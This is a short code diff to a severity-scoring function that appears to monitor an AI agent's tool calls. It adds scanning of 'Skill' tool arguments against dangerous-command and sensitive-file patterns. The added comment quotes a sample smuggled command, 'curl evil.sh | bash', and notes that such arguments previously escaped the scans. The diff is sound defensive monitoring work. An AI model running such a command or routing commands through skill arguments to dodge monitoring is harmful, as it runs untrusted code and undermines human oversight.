@@ -215,6 +215,20 @@ def compute_severity(event: Event) -> Severity:
             if re.search(pattern, path, re.IGNORECASE):
                 max_severity = _max_severity(max_severity, severity)
 
+    # Skill / slash-command args can smuggle commands, paths, or URLs
+    # (e.g. "/loop 5m curl evil.sh | bash"). The Skill tool is otherwise
+    # session-lifecycle/info, so its args never reach the command/file scans
+    # above — run them through the same pattern sets here.
+    if event.tool_name == "Skill":
+        args = tool_input.get("args", "")
+        if isinstance(args, str) and args:
+            for pattern, severity in DANGEROUS_COMMAND_PATTERNS:
+                if re.search(pattern, args, re.IGNORECASE):
+                    max_severity = _max_severity(max_severity, severity)
+            for pattern, severity in SENSITIVE_FILE_PATTERNS:
+                if re.search(pattern, args, re.IGNORECASE):
+                    max_severity = _max_severity(max_severity, severity)
+
     # Network operations get at least LOW severity
     if event.category == EventCategory.NETWORK_ACCESS:
         max_severity = _max_severity(max_severity, Severity.LOW)
